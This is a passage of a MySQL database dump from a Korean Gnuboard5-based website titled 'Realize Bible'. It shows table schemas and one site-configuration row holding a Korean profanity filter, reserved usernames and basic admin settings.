  UNIQUE KEY `fkey1` (`bo_table`,`wr_id`,`mb_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_board_good`
--

LOCK TABLES `g5_board_good` WRITE;
/*!40000 ALTER TABLE `g5_board_good` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_board_good` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_board_new`
--

DROP TABLE IF EXISTS `g5_board_new`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_board_new` (
  `bn_id` int(11) NOT NULL AUTO_INCREMENT,
  `bo_table` varchar(20) NOT NULL DEFAULT '',
  `wr_id` int(11) NOT NULL DEFAULT '0',
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `bn_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`bn_id`),
  KEY `mb_id` (`mb_id`)
) ENGINE=MyISAM AUTO_INCREMENT=21 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_board_new`
--

LOCK TABLES `g5_board_new` WRITE;
/*!40000 ALTER TABLE `g5_board_new` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_board_new` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_cert_history`
--

DROP TABLE IF EXISTS `g5_cert_history`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_cert_history` (
  `cr_id` int(11) NOT NULL AUTO_INCREMENT,
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `cr_company` varchar(255) NOT NULL DEFAULT '',
  `cr_method` varchar(255) NOT NULL DEFAULT '',
  `cr_ip` varchar(255) NOT NULL DEFAULT '',
  `cr_date` date NOT NULL DEFAULT '0000-00-00',
  `cr_time` time NOT NULL DEFAULT '00:00:00',
  PRIMARY KEY (`cr_id`),
  KEY `mb_id` (`mb_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_cert_history`
--

LOCK TABLES `g5_cert_history` WRITE;
/*!40000 ALTER TABLE `g5_cert_history` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_cert_history` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_config`
--

DROP TABLE IF EXISTS `g5_config`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_config` (
  `cf_title` varchar(255) NOT NULL DEFAULT '',
  `cf_admin` varchar(255) NOT NULL DEFAULT '',
  `cf_admin_email` varchar(255) NOT NULL DEFAULT '',
  `cf_admin_email_name` varchar(255) NOT NULL DEFAULT '',
  `cf_include_index` varchar(255) NOT NULL DEFAULT '',
  `cf_include_head` varchar(255) NOT NULL DEFAULT '',
  `cf_include_tail` varchar(255) NOT NULL DEFAULT '',
  `cf_add_script` text NOT NULL,
  `cf_use_point` tinyint(4) NOT NULL DEFAULT '0',
  `cf_point_term` int(11) NOT NULL DEFAULT '0',
  `cf_use_copy_log` tinyint(4) NOT NULL DEFAULT '0',
  `cf_use_email_certify` tinyint(4) NOT NULL DEFAULT '0',
  `cf_login_point` int(11) NOT NULL DEFAULT '0',
  `cf_cut_name` tinyint(4) NOT NULL DEFAULT '0',
  `cf_nick_modify` int(11) NOT NULL DEFAULT '0',
  `cf_new_skin` varchar(255) NOT NULL DEFAULT '',
  `cf_new_rows` int(11) NOT NULL DEFAULT '0',
  `cf_search_skin` varchar(255) NOT NULL DEFAULT '',
  `cf_connect_skin` varchar(255) NOT NULL DEFAULT '',
  `cf_faq_skin` varchar(255) NOT NULL DEFAULT '',
  `cf_read_point` int(11) NOT NULL DEFAULT '0',
  `cf_write_point` int(11) NOT NULL DEFAULT '0',
  `cf_comment_point` int(11) NOT NULL DEFAULT '0',
  `cf_download_point` int(11) NOT NULL DEFAULT '0',
  `cf_write_pages` int(11) NOT NULL DEFAULT '0',
  `cf_mobile_pages` int(11) NOT NULL DEFAULT '0',
  `cf_link_target` varchar(255) NOT NULL DEFAULT '',
  `cf_delay_sec` int(11) NOT NULL DEFAULT '0',
  `cf_filter` text NOT NULL,
  `cf_possible_ip` text NOT NULL,
  `cf_intercept_ip` text NOT NULL,
  `cf_analytics` text NOT NULL,
  `cf_add_meta` text NOT NULL,
  `cf_syndi_token` varchar(255) NOT NULL,
  `cf_syndi_except` text NOT NULL,
  `cf_member_skin` varchar(255) NOT NULL DEFAULT '',
  `cf_use_homepage` tinyint(4) NOT NULL DEFAULT '0',
  `cf_req_homepage` tinyint(4) NOT NULL DEFAULT '0',
  `cf_use_tel` tinyint(4) NOT NULL DEFAULT '0',
  `cf_req_tel` tinyint(4) NOT NULL DEFAULT '0',
  `cf_use_hp` tinyint(4) NOT NULL DEFAULT '0',
  `cf_req_hp` tinyint(4) NOT NULL DEFAULT '0',
  `cf_use_addr` tinyint(4) NOT NULL DEFAULT '0',
  `cf_req_addr` tinyint(4) NOT NULL DEFAULT '0',
  `cf_use_signature` tinyint(4) NOT NULL DEFAULT '0',
  `cf_req_signature` tinyint(4) NOT NULL DEFAULT '0',
  `cf_use_profile` tinyint(4) NOT NULL DEFAULT '0',
  `cf_req_profile` tinyint(4) NOT NULL DEFAULT '0',
  `cf_register_level` tinyint(4) NOT NULL DEFAULT '0',
  `cf_register_point` int(11) NOT NULL DEFAULT '0',
  `cf_icon_level` tinyint(4) NOT NULL DEFAULT '0',
  `cf_use_recommend` tinyint(4) NOT NULL DEFAULT '0',
  `cf_recommend_point` int(11) NOT NULL DEFAULT '0',
  `cf_leave_day` int(11) NOT NULL DEFAULT '0',
  `cf_search_part` int(11) NOT NULL DEFAULT '0',
  `cf_email_use` tinyint(4) NOT NULL DEFAULT '0',
  `cf_email_wr_super_admin` tinyint(4) NOT NULL DEFAULT '0',
  `cf_email_wr_group_admin` tinyint(4) NOT NULL DEFAULT '0',
  `cf_email_wr_board_admin` tinyint(4) NOT NULL DEFAULT '0',
  `cf_email_wr_write` tinyint(4) NOT NULL DEFAULT '0',
  `cf_email_wr_comment_all` tinyint(4) NOT NULL DEFAULT '0',
  `cf_email_mb_super_admin` tinyint(4) NOT NULL DEFAULT '0',
  `cf_email_mb_member` tinyint(4) NOT NULL DEFAULT '0',
  `cf_email_po_super_admin` tinyint(4) NOT NULL DEFAULT '0',
  `cf_prohibit_id` text NOT NULL,
  `cf_prohibit_email` text NOT NULL,
  `cf_new_del` int(11) NOT NULL DEFAULT '0',
  `cf_memo_del` int(11) NOT NULL DEFAULT '0',
  `cf_visit_del` int(11) NOT NULL DEFAULT '0',
  `cf_popular_del` int(11) NOT NULL DEFAULT '0',
  `cf_optimize_date` date NOT NULL DEFAULT '0000-00-00',
  `cf_use_member_icon` tinyint(4) NOT NULL DEFAULT '0',
  `cf_member_icon_size` int(11) NOT NULL DEFAULT '0',
  `cf_member_icon_width` int(11) NOT NULL DEFAULT '0',
  `cf_member_icon_height` int(11) NOT NULL DEFAULT '0',
  `cf_login_minutes` int(11) NOT NULL DEFAULT '0',
  `cf_image_extension` varchar(255) NOT NULL DEFAULT '',
  `cf_flash_extension` varchar(255) NOT NULL DEFAULT '',
  `cf_movie_extension` varchar(255) NOT NULL DEFAULT '',
  `cf_formmail_is_member` tinyint(4) NOT NULL DEFAULT '0',
  `cf_page_rows` int(11) NOT NULL DEFAULT '0',
  `cf_mobile_page_rows` int(11) NOT NULL DEFAULT '0',
  `cf_visit` varchar(255) NOT NULL DEFAULT '',
  `cf_max_po_id` int(11) NOT NULL DEFAULT '0',
  `cf_stipulation` text NOT NULL,
  `cf_privacy` text NOT NULL,
  `cf_open_modify` int(11) NOT NULL DEFAULT '0',
  `cf_memo_send_point` int(11) NOT NULL DEFAULT '0',
  `cf_mobile_new_skin` varchar(255) NOT NULL DEFAULT '',
  `cf_mobile_search_skin` varchar(255) NOT NULL DEFAULT '',
  `cf_mobile_connect_skin` varchar(255) NOT NULL DEFAULT '',
  `cf_mobile_faq_skin` varchar(255) NOT NULL DEFAULT '',
  `cf_mobile_member_skin` varchar(255) NOT NULL DEFAULT '',
  `cf_captcha_mp3` varchar(255) NOT NULL DEFAULT '',
  `cf_editor` varchar(255) NOT NULL DEFAULT '',
  `cf_cert_use` tinyint(4) NOT NULL DEFAULT '0',
  `cf_cert_ipin` varchar(255) NOT NULL DEFAULT '',
  `cf_cert_hp` varchar(255) NOT NULL DEFAULT '',
  `cf_cert_kcb_cd` varchar(255) NOT NULL DEFAULT '',
  `cf_cert_kcp_cd` varchar(255) NOT NULL DEFAULT '',
  `cf_lg_mid` varchar(255) NOT NULL DEFAULT '',
  `cf_lg_mert_key` varchar(255) NOT NULL DEFAULT '',
  `cf_cert_limit` int(11) NOT NULL DEFAULT '0',
  `cf_cert_req` tinyint(4) NOT NULL DEFAULT '0',
  `cf_sms_use` varchar(255) NOT NULL DEFAULT '',
  `cf_icode_id` varchar(255) NOT NULL DEFAULT '',
  `cf_icode_pw` varchar(255) NOT NULL DEFAULT '',
  `cf_icode_server_ip` varchar(255) NOT NULL DEFAULT '',
  `cf_icode_server_port` varchar(255) NOT NULL DEFAULT '',
  `cf_googl_shorturl_apikey` varchar(255) NOT NULL DEFAULT '',
  `cf_facebook_appid` varchar(255) NOT NULL,
  `cf_facebook_secret` varchar(255) NOT NULL,
  `cf_twitter_key` varchar(255) NOT NULL,
  `cf_twitter_secret` varchar(255) NOT NULL,
  `cf_kakao_js_apikey` varchar(255) NOT NULL,
  `cf_1_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_2_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_3_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_4_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_5_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_6_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_7_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_8_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_9_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_10_subj` varchar(255) NOT NULL DEFAULT '',
  `cf_1` varchar(255) NOT NULL DEFAULT '',
  `cf_2` varchar(255) NOT NULL DEFAULT '',
  `cf_3` varchar(255) NOT NULL DEFAULT '',
  `cf_4` varchar(255) NOT NULL DEFAULT '',
  `cf_5` varchar(255) NOT NULL DEFAULT '',
  `cf_6` varchar(255) NOT NULL DEFAULT '',
  `cf_7` varchar(255) NOT NULL DEFAULT '',
  `cf_8` varchar(255) NOT NULL DEFAULT '',
  `cf_9` varchar(255) NOT NULL DEFAULT '',
  `cf_10` varchar(255) NOT NULL DEFAULT '',
  `cf_themes` varchar(255) DEFAULT NULL,
  `cf_mobile_themes` varchar(255) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_config`
--

LOCK TABLES `g5_config` WRITE;
/*!40000 ALTER TABLE `g5_config` DISABLE KEYS */;
INSERT INTO `g5_config` VALUES ('Realize Bible','admin','admin@jubinna.or.kr','관리자','','','','',1,0,1,0,100,15,60,'basic',15,'basic','basic','basic',0,0,0,0,10,5,'_blank',30,'18아,18놈,18새끼,18년,18뇬,18노,18것,18넘,개년,개놈,개뇬,개새,개색끼,개세끼,개세이,개쉐이,개쉑,개쉽,개시키,개자식,개좆,게색기,게색끼,광뇬,뇬,눈깔,뉘미럴,니귀미,니기미,니미,도촬,되질래,뒈져라,뒈진다,디져라,디진다,디질래,병쉰,병신,뻐큐,뻑큐,뽁큐,삐리넷,새꺄,쉬발,쉬밸,쉬팔,쉽알,스패킹,스팽,시벌,시부랄,시부럴,시부리,시불,시브랄,시팍,시팔,시펄,실밸,십8,십쌔,십창,싶알,쌉년,썅놈,쌔끼,쌩쑈,썅,써벌,썩을년,쎄꺄,쎄엑,쓰바,쓰발,쓰벌,쓰팔,씨8,씨댕,씨바,씨발,씨뱅,씨봉알,씨부랄,씨부럴,씨부렁,씨부리,씨불,씨브랄,씨빠,씨빨,씨뽀랄,씨팍,씨팔,씨펄,씹,아가리,아갈이,엄창,접년,잡놈,재랄,저주글,조까,조빠,조쟁이,조지냐,조진다,조질래,존나,존니,좀물,좁년,좃,좆,좇,쥐랄,쥐롤,쥬디,지랄,지럴,지롤,지미랄,쫍빱,凸,퍽큐,뻑큐,빠큐,ㅅㅂㄹㅁ','','','','','','','basic',0,0,0,0,0,1,0,0,0,0,0,1,2,1000,2,0,0,30,10000,1,0,0,0,0,0,0,0,0,'admin,administrator,관리자,운영자,어드민,주인장,webmaster,웹마스터,sysop,시삽,시샵,manager,매니저,메니저,root,루트,su,guest,방문객','',30,180,180,180,'2015-09-08',2,5000,22,22,10,'gif|jpg|jpeg|png','swf','asx|asf|wmv|wma|mpg|mpeg|mov|avi|mp3',1,15,15,'오늘:22,어제:49,최대:54,전체:1488',0,'해당 홈페이지에 맞는 회원가입약관을 입력합니다.','해당 홈페이지에 맞는 개인정보처리방침을 입력합니다.',0,500,'basic','basic','basic','basic','basic','basic','smarteditor2',0,'','','','','','',2,0,'','','','211.172.232.124','7295','','','','','','','','','','','','','','','','','','','','','','','','','','','sungjin','basic');
/*!40000 ALTER TABLE `g5_config` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_config2`
--

DROP TABLE IF EXISTS `g5_config2`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_config2` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `cf_id` varchar(30) NOT NULL DEFAULT '',
  `cf_header_logo` text NOT NULL,
  `cf_site_addr` text NOT NULL,
  `cf_copyright` text NOT NULL,
  `cf_keywords` text NOT NULL,
  `cf_description` text NOT NULL,
  `cf_templete` varchar(30) NOT NULL DEFAULT '',
  `cf_max_menu` tinyint(4) NOT NULL DEFAULT '10',
  `cf_max_submenu` tinyint(4) NOT NULL DEFAULT '10',
  `cf_width_main_total` int(11) NOT NULL DEFAULT '960',
  `cf_width_main` int(11) NOT NULL DEFAULT '520',
  `cf_width_main_left` int(11) NOT NULL DEFAULT '220',
  `cf_width_main_right` int(11) NOT NULL DEFAULT '220',
  `cf_hide_left` tinyint(4) NOT NULL DEFAULT '0',
  `cf_hide_right` tinyint(4) NOT NULL DEFAULT '0',
  `cf_max_main` tinyint(4) NOT NULL DEFAULT '30',
  `cf_max_main_left` tinyint(4) NOT NULL DEFAULT '15',
  `cf_max_main_right` tinyint(4) NOT NULL DEFAULT '15',
  `cf_max_head` tinyint(4) NOT NULL DEFAULT '5',
  `cf_max_tail` tinyint(4) NOT NULL DEFAULT '5',
  `cf_menu_name_0` text NOT NULL,
  `cf_menu_name_1` text NOT NULL,
  `cf_menu_name_2` text NOT NULL,
  `cf_menu_name_3` text NOT NULL,
  `cf_menu_name_4` text NOT NULL,
  `cf_menu_name_5` text NOT NULL,
  `cf_menu_name_6` text NOT NULL,
  `cf_menu_name_7` text NOT NULL,
  `cf_menu_name_8` text NOT NULL,
  `cf_menu_name_9` text NOT NULL,
  `cf_menu_leng_0` int(11) NOT NULL DEFAULT '0',
  `cf_menu_leng_1` int(11) NOT NULL DEFAULT '0',
  `cf_menu_leng_2` int(11) NOT NULL DEFAULT '0',
  `cf_menu_leng_3` int(11) NOT NULL DEFAULT '0',
  `cf_menu_leng_4` int(11) NOT NULL DEFAULT '0',
  `cf_menu_leng_5` int(11) NOT NULL DEFAULT '0',
  `cf_menu_leng_6` int(11) NOT NULL DEFAULT '0',
  `cf_menu_leng_7` int(11) NOT NULL DEFAULT '0',
  `cf_menu_leng_8` int(11) NOT NULL DEFAULT '0',
  `cf_menu_leng_9` int(11) NOT NULL DEFAULT '0',
  `cf_menu_link_0` text NOT NULL,
  `cf_menu_link_1` text NOT NULL,
  `cf_menu_link_2` text NOT NULL,
  `cf_menu_link_3` text NOT NULL,
  `cf_menu_link_4` text NOT NULL,
  `cf_menu_link_5` text NOT NULL,
  `cf_menu_link_6` text NOT NULL,
  `cf_menu_link_7` text NOT NULL,
  `cf_menu_link_8` text NOT NULL,
  `cf_menu_link_9` text NOT NULL,
  `cf_submenu_name_0_0` text NOT NULL,
  `cf_submenu_name_0_1` text NOT NULL,
  `cf_submenu_name_0_2` text NOT NULL,
  `cf_submenu_name_0_3` text NOT NULL,
  `cf_submenu_name_0_4` text NOT NULL,
  `cf_submenu_name_0_5` text NOT NULL,
  `cf_submenu_name_0_6` text NOT NULL,
  `cf_submenu_name_0_7` text NOT NULL,
  `cf_submenu_name_0_8` text NOT NULL,
  `cf_submenu_name_0_9` text NOT NULL,
  `cf_submenu_link_0_0` text NOT NULL,
  `cf_submenu_link_0_1` text NOT NULL,
  `cf_submenu_link_0_2` text NOT NULL,
  `cf_submenu_link_0_3` text NOT NULL,
  `cf_submenu_link_0_4` text NOT NULL,
  `cf_submenu_link_0_5` text NOT NULL,
  `cf_submenu_link_0_6` text NOT NULL,
  `cf_submenu_link_0_7` text NOT NULL,
  `cf_submenu_link_0_8` text NOT NULL,
  `cf_submenu_link_0_9` text NOT NULL,
  `cf_submenu_name_1_0` text NOT NULL,
  `cf_submenu_name_1_1` text NOT NULL,
  `cf_submenu_name_1_2` text NOT NULL,
  `cf_submenu_name_1_3` text NOT NULL,
  `cf_submenu_name_1_4` text NOT NULL,
  `cf_submenu_name_1_5` text NOT NULL,
  `cf_submenu_name_1_6` text NOT NULL,
  `cf_submenu_name_1_7` text NOT NULL,
  `cf_submenu_name_1_8` text NOT NULL,
  `cf_submenu_name_1_9` text NOT NULL,
  `cf_submenu_link_1_0` text NOT NULL,
  `cf_submenu_link_1_1` text NOT NULL,
  `cf_submenu_link_1_2` text NOT NULL,
  `cf_submenu_link_1_3` text NOT NULL,
  `cf_submenu_link_1_4` text NOT NULL,
  `cf_submenu_link_1_5` text NOT NULL,
  `cf_submenu_link_1_6` text NOT NULL,
  `cf_submenu_link_1_7` text NOT NULL,
  `cf_submenu_link_1_8` text NOT NULL,
  `cf_submenu_link_1_9` text NOT NULL,
  `cf_submenu_name_2_0` text NOT NULL,
  `cf_submenu_name_2_1` text NOT NULL,
  `cf_submenu_name_2_2` text NOT NULL,
  `cf_submenu_name_2_3` text NOT NULL,
  `cf_submenu_name_2_4` text NOT NULL,
  `cf_submenu_name_2_5` text NOT NULL,
  `cf_submenu_name_2_6` text NOT NULL,
  `cf_submenu_name_2_7` text NOT NULL,
  `cf_submenu_name_2_8` text NOT NULL,
  `cf_submenu_name_2_9` text NOT NULL,
  `cf_submenu_link_2_0` text NOT NULL,
  `cf_submenu_link_2_1` text NOT NULL,
  `cf_submenu_link_2_2` text NOT NULL,
  `cf_submenu_link_2_3` text NOT NULL,
  `cf_submenu_link_2_4` text NOT NULL,
  `cf_submenu_link_2_5` text NOT NULL,
  `cf_submenu_link_2_6` text NOT NULL,
  `cf_submenu_link_2_7` text NOT NULL,
  `cf_submenu_link_2_8` text NOT NULL,
  `cf_submenu_link_2_9` text NOT NULL,
  `cf_submenu_name_3_0` text NOT NULL,
  `cf_submenu_name_3_1` text NOT NULL,
  `cf_submenu_name_3_2` text NOT NULL,
  `cf_submenu_name_3_3` text NOT NULL,
  `cf_submenu_name_3_4` text NOT NULL,
  `cf_submenu_name_3_5` text NOT NULL,
  `cf_submenu_name_3_6` text NOT NULL,
  `cf_submenu_name_3_7` text NOT NULL,
  `cf_submenu_name_3_8` text NOT NULL,
  `cf_submenu_name_3_9` text NOT NULL,
  `cf_submenu_link_3_0` text NOT NULL,
  `cf_submenu_link_3_1` text NOT NULL,
  `cf_submenu_link_3_2` text NOT NULL,
  `cf_submenu_link_3_3` text NOT NULL,
  `cf_submenu_link_3_4` text NOT NULL,
  `cf_submenu_link_3_5` text NOT NULL,
  `cf_submenu_link_3_6` text NOT NULL,
  `cf_submenu_link_3_7` text NOT NULL,
  `cf_submenu_link_3_8` text NOT NULL,
  `cf_submenu_link_3_9` text NOT NULL,
  `cf_submenu_name_4_0` text NOT NULL,
  `cf_submenu_name_4_1` text NOT NULL,
  `cf_submenu_name_4_2` text NOT NULL,
  `cf_submenu_name_4_3` text NOT NULL,
  `cf_submenu_name_4_4` text NOT NULL,
  `cf_submenu_name_4_5` text NOT NULL,
  `cf_submenu_name_4_6` text NOT NULL,
  `cf_submenu_name_4_7` text NOT NULL,
  `cf_submenu_name_4_8` text NOT NULL,
  `cf_submenu_name_4_9` text NOT NULL,
  `cf_submenu_link_4_0` text NOT NULL,
  `cf_submenu_link_4_1` text NOT NULL,
  `cf_submenu_link_4_2` text NOT NULL,
  `cf_submenu_link_4_3` text NOT NULL,
  `cf_submenu_link_4_4` text NOT NULL,
  `cf_submenu_link_4_5` text NOT NULL,
  `cf_submenu_link_4_6` text NOT NULL,
  `cf_submenu_link_4_7` text NOT NULL,
  `cf_submenu_link_4_8` text NOT NULL,
  `cf_submenu_link_4_9` text NOT NULL,
  `cf_submenu_name_5_0` text NOT NULL,
  `cf_submenu_name_5_1` text NOT NULL,
  `cf_submenu_name_5_2` text NOT NULL,
  `cf_submenu_name_5_3` text NOT NULL,
  `cf_submenu_name_5_4` text NOT NULL,
  `cf_submenu_name_5_5` text NOT NULL,
  `cf_submenu_name_5_6` text NOT NULL,
  `cf_submenu_name_5_7` text NOT NULL,
  `cf_submenu_name_5_8` text NOT NULL,
  `cf_submenu_name_5_9` text NOT NULL,
  `cf_submenu_link_5_0` text NOT NULL,
  `cf_submenu_link_5_1` text NOT NULL,
  `cf_submenu_link_5_2` text NOT NULL,
  `cf_submenu_link_5_3` text NOT NULL,
  `cf_submenu_link_5_4` text NOT NULL,
  `cf_submenu_link_5_5` text NOT NULL,
  `cf_submenu_link_5_6` text NOT NULL,
  `cf_submenu_link_5_7` text NOT NULL,
  `cf_submenu_link_5_8` text NOT NULL,
  `cf_submenu_link_5_9` text NOT NULL,
  `cf_submenu_name_6_0` text NOT NULL,
  `cf_submenu_name_6_1` text NOT NULL,
  `cf_submenu_name_6_2` text NOT NULL,
  `cf_submenu_name_6_3` text NOT NULL,
  `cf_submenu_name_6_4` text NOT NULL,
  `cf_submenu_name_6_5` text NOT NULL,
  `cf_submenu_name_6_6` text NOT NULL,
  `cf_submenu_name_6_7` text NOT NULL,
  `cf_submenu_name_6_8` text NOT NULL,
  `cf_submenu_name_6_9` text NOT NULL,
  `cf_submenu_link_6_0` text NOT NULL,
  `cf_submenu_link_6_1` text NOT NULL,
  `cf_submenu_link_6_2` text NOT NULL,
  `cf_submenu_link_6_3` text NOT NULL,
  `cf_submenu_link_6_4` text NOT NULL,
  `cf_submenu_link_6_5` text NOT NULL,
  `cf_submenu_link_6_6` text NOT NULL,
  `cf_submenu_link_6_7` text NOT NULL,
  `cf_submenu_link_6_8` text NOT NULL,
  `cf_submenu_link_6_9` text NOT NULL,
  `cf_submenu_name_7_0` text NOT NULL,
  `cf_submenu_name_7_1` text NOT NULL,
  `cf_submenu_name_7_2` text NOT NULL,
  `cf_submenu_name_7_3` text NOT NULL,
  `cf_submenu_name_7_4` text NOT NULL,
  `cf_submenu_name_7_5` text NOT NULL,
  `cf_submenu_name_7_6` text NOT NULL,
  `cf_submenu_name_7_7` text NOT NULL,
  `cf_submenu_name_7_8` text NOT NULL,
  `cf_submenu_name_7_9` text NOT NULL,
  `cf_submenu_link_7_0` text NOT NULL,
  `cf_submenu_link_7_1` text NOT NULL,
  `cf_submenu_link_7_2` text NOT NULL,
  `cf_submenu_link_7_3` text NOT NULL,
  `cf_submenu_link_7_4` text NOT NULL,
  `cf_submenu_link_7_5` text NOT NULL,
  `cf_submenu_link_7_6` text NOT NULL,
  `cf_submenu_link_7_7` text NOT NULL,
  `cf_submenu_link_7_8` text NOT NULL,
  `cf_submenu_link_7_9` text NOT NULL,
  `cf_submenu_name_8_0` text NOT NULL,
  `cf_submenu_name_8_1` text NOT NULL,
  `cf_submenu_name_8_2` text NOT NULL,
  `cf_submenu_name_8_3` text NOT NULL,
  `cf_submenu_name_8_4` text NOT NULL,
  `cf_submenu_name_8_5` text NOT NULL,
  `cf_submenu_name_8_6` text NOT NULL,
  `cf_submenu_name_8_7` text NOT NULL,
  `cf_submenu_name_8_8` text NOT NULL,
  `cf_submenu_name_8_9` text NOT NULL,
  `cf_submenu_link_8_0` text NOT NULL,
  `cf_submenu_link_8_1` text NOT NULL,
  `cf_submenu_link_8_2` text NOT NULL,
  `cf_submenu_link_8_3` text NOT NULL,
  `cf_submenu_link_8_4` text NOT NULL,
  `cf_submenu_link_8_5` text NOT NULL,
  `cf_submenu_link_8_6` text NOT NULL,
  `cf_submenu_link_8_7` text NOT NULL,
  `cf_submenu_link_8_8` text NOT NULL,
  `cf_submenu_link_8_9` text NOT NULL,
  `cf_submenu_name_9_0` text NOT NULL,
  `cf_submenu_name_9_1` text NOT NULL,
  `cf_submenu_name_9_2` text NOT NULL,
  `cf_submenu_name_9_3` text NOT NULL,
  `cf_submenu_name_9_4` text NOT NULL,
  `cf_submenu_name_9_5` text NOT NULL,
  `cf_submenu_name_9_6` text NOT NULL,
  `cf_submenu_name_9_7` text NOT NULL,
  `cf_submenu_name_9_8` text NOT NULL,
  `cf_submenu_name_9_9` text NOT NULL,
  `cf_submenu_link_9_0` text NOT NULL,
  `cf_submenu_link_9_1` text NOT NULL,
  `cf_submenu_link_9_2` text NOT NULL,
  `cf_submenu_link_9_3` text NOT NULL,
  `cf_submenu_link_9_4` text NOT NULL,
  `cf_submenu_link_9_5` text NOT NULL,
  `cf_submenu_link_9_6` text NOT NULL,
  `cf_submenu_link_9_7` text NOT NULL,
  `cf_submenu_link_9_8` text NOT NULL,
  `cf_submenu_link_9_9` text NOT NULL,
  `cf_main_nouse_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_4` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_5` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_6` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_7` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_8` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_9` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_10` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_11` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_12` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_13` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_14` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_15` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_16` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_17` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_18` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_19` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_20` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_21` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_22` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_23` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_24` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_25` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_26` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_27` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_28` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_29` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_30` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_31` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_32` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_33` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_34` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_35` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_36` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_37` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_38` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_nouse_39` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_name_0` text NOT NULL,
  `cf_main_name_1` text NOT NULL,
  `cf_main_name_2` text NOT NULL,
  `cf_main_name_3` text NOT NULL,
  `cf_main_name_4` text NOT NULL,
  `cf_main_name_5` text NOT NULL,
  `cf_main_name_6` text NOT NULL,
  `cf_main_name_7` text NOT NULL,
  `cf_main_name_8` text NOT NULL,
  `cf_main_name_9` text NOT NULL,
  `cf_main_name_10` text NOT NULL,
  `cf_main_name_11` text NOT NULL,
  `cf_main_name_12` text NOT NULL,
  `cf_main_name_13` text NOT NULL,
  `cf_main_name_14` text NOT NULL,
  `cf_main_name_15` text NOT NULL,
  `cf_main_name_16` text NOT NULL,
  `cf_main_name_17` text NOT NULL,
  `cf_main_name_18` text NOT NULL,
  `cf_main_name_19` text NOT NULL,
  `cf_main_name_20` text NOT NULL,
  `cf_main_name_21` text NOT NULL,
  `cf_main_name_22` text NOT NULL,
  `cf_main_name_23` text NOT NULL,
